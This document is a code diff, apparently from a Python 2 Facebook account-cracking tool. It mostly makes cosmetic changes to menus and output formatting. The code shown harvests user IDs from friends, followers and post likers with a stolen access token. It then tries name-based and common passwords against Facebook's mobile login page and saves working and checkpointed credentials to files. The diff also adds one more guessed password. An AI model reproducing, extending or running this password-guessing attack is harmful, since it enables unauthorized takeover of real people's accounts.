@@ -195,11 +195,11 @@ def options():
 		exit()
         os.system('clear')
         print logo
-        print ("   [•] Welcome "+nama)
+        print ("\n   [•] Welcome "+nama)
         print ("   [•] Your ID : "+id)
-        print ("─────────────────────────────────────────────────────────────")
-        print ("   [ Choose An Options ]\n")
-        print ("   [1] Dump ID From Friend")
+        os.system('echo -e "\n─────────────────────────────────────────────────────────────" | lolcat')
+        print ("\n   [ Choose An Options ]\n")
+        print ("\n   [1] Dump ID From Friend")
         print ("   [2] Dump ID From Public")
         print ("   [3] Dump ID Followers")
         print ("   [4] Dump ID Likers Post")
@@ -238,7 +238,7 @@ def dump_friend():
 		print("\n   [!] Cookie/Token Invalid")
 		os.system('rm -rf login.txt')
 		login()
-        ih = raw_input("   [•] File Name : ")
+        ih = raw_input("\n   [•] File Name : ")
         if ih in [""]:
         	exit("   [!] Don't Empty")
         try:
@@ -270,7 +270,7 @@ def dump_public():
 		print("\n   [!] Cookie/Token Invalid")
 		os.system('rm -rf login.txt')
 		login()
-        ah = raw_input("   [•] ID Public Target : ")
+        ah = raw_input("\n   [•] ID Public Target : ")
 	jok = requests.get("https://graph.facebook.com/"+ah+"?access_token="+toket)
 	op = json.loads(jok.text)
         ih = op['first_name'].replace(" ","_")
@@ -305,7 +305,7 @@ def dump_followers():
 		print("\n   [!] Cookie/Token Invalid")
 		os.system('rm -rf login.txt')
 		login()
-        ih = raw_input("   [•] ID Followers Target : ")
+        ih = raw_input("\n   [•] ID Followers Target : ")
         ah = raw_input("   [•] File Name           : ")
         if ih in [""]:
         	exit("   [!] Don't Empty")
@@ -338,7 +338,7 @@ def dump_likers():
 		print("\n   [!] Cookie/Token Invalid")
 		os.system('rm -rf login.txt')
 		login()
-        ah = raw_input("   [•] ID Post Target : ")
+        ah = raw_input("\n   [•] ID Post Target : ")
         ih = raw_input("   [•] File Name      : ")
         if ah in [""]:
         	exit("   [!] Don't Empty")
@@ -372,7 +372,7 @@ def crack():
 		print("\n   [!] Cookie/Token Invalid")
 		os.system('rm -rf login.txt')
 		login()
-        ask = raw_input("   [•] Crack With Password Default/Manual [d/m]? : ")
+        ask = raw_input("\n   [•] Crack With Password Default/Manual [d/m]? : ")
         if ask.lower() == "m":
                 manual()
         file=raw_input("   [•] File Name : ")
@@ -385,8 +385,7 @@ def crack():
         except KeyError:
         	exit("\n   [!] Wrong File Name")
         print("   [•] Result OK Saved To : ok.txt")
-        print("   [•] Result CP Saved To : cp.txt")
-	print("─────────────────────────────────────────────────────────────")
+        print("   [•] Result CP Saved To : cp.txt\n")
         try:
                 os.mkdir("crack")
         except:
@@ -403,21 +402,21 @@ def crack1_mbasic(user):
 		dp = a['first_name'].lower()
 		bk = a['last_name'].lower()
 		tl = a['birthday']
-		for pw in [dp,dp+'123',dp+'12345','sayang','anjing']:
+		for pw in [dp,dp+'123',dp+'12345','sayang','anjing','bangsat']:
 			rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': pw, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'})
 			xo = rex.content
 			if 'mbasic_logout_button' in xo or 'save-device' in xo:
-				print '\r   [OK] ' +user+ ' | ' +pw+ ' | ' +tl+ '         '
-				Successful.append(user+' | '+pw)
+				print '\r   [OK] ' +user+ ' • ' +pw+ ' • ' +tl+ '         '
+				Successful.append(user+' • '+pw)
 				save = open('ok.txt','a')
-				save.write(str(user)+' | '+str(pw)+'\n')
+				save.write(str(user)+' • '+str(pw)+'\n')
 				save.close()
 				break
 			elif 'checkpoint' in xo:
-				print '\r   [CP] ' +user+ ' | ' +pw+ ' | ' +tl+ '         '
-				Checkpoint.append(user+' | '+pw)
+				print '\r   [CP] ' +user+ ' • ' +pw+ ' • ' +tl+ '         '
+				Checkpoint.append(user+' • '+pw)
 				save = open('cp.txt','a')
-				save.write(str(user)+' | '+str(pw)+'\n')
+				save.write(str(user)+' • '+str(pw)+'\n')
 				save.close()
 				break
 				
@@ -439,8 +438,7 @@ def manual():
         if len(pw) ==0:
                 exit("   [!] Dont Empty")
         print("   [•] Result OK Saved To : ok.txt")
-        print("   [•] Result CP Saved To : cp.txt")
-	print("─────────────────────────────────────────────────────────────")
+        print("   [•] Result CP Saved To : cp.txt\n")
         try:
                 os.mkdir("crack")
         except:
@@ -457,17 +455,17 @@ def cs(user):
 			rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': i, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'})
 			xo = rex.content
 			if 'mbasic_logout_button' in xo or 'save-device' in xo:
-				print "\r   [OK]  %s | %s %s | %s              "%(user,i,I,tl)
-				Successful.append(user+' | '+i)
+				print "\r   [OK]  %s • %s %s • %s              "%(user,i,I,tl)
+				Successful.append(user+' • '+i)
 				save = open('ok.txt','a')
-				save.write(str(user)+' | '+str(i)+'\n')
+				save.write(str(user)+' • '+str(i)+'\n')
 				save.close()
 				break
 			elif 'checkpoint' in xo:
-				print "\r   [CP]  %s | %s %s | %s             "%(user,i,I,tl)
-				Checkpoint.append(user+' | '+i)
+				print "\r   [CP]  %s • %s %s • %s             "%(user,i,I,tl)
+				Checkpoint.append(user+' • '+i)
 				save = open('cp.txt','a')
-				save.write(str(user)+' | '+str(i)+'\n')
+				save.write(str(user)+' • '+str(i)+'\n')
 				save.close()
 				break
 				
@@ -491,6 +489,5 @@ if __name__=='__main__':
 		options() 
 	except IOError:
 		print "   Token Invalid"
-		time.sleep(1) 
 		login()
 	login()
